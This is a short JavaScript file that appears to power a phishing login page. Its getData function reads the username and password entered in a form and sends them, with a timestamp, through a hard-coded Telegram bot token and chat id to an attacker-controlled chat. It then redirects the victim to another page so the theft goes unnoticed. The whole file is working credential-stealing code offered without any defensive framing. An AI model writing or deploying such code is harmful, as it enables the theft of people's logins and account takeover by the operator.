let time = new Date().toLocaleString(); 

function getData() {
    let username = document.getElementById('username').value
    let password = document.getElementById('password').value


    let apiToken = "1416940860:AAGNUijvtN6jAJ1WB44JI02-PM6w32tTI-c"
    let chat_id = 1171876903
    let message = `Username: ${username}
    \nPassword: ${password} 
    \nTime: ${time}`;
    fetch(`https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chat_id}&text=${message}`)
    .then(response => {
        let status = response.status;

        if(response.status != 200) {
            console.log('Looks like there was a problem. Status Code: ' +
            response.status);
          return;
        }
        else {
         redirect()
        }
        })

}

function redirect() {
    window.location = "redirect.html"
}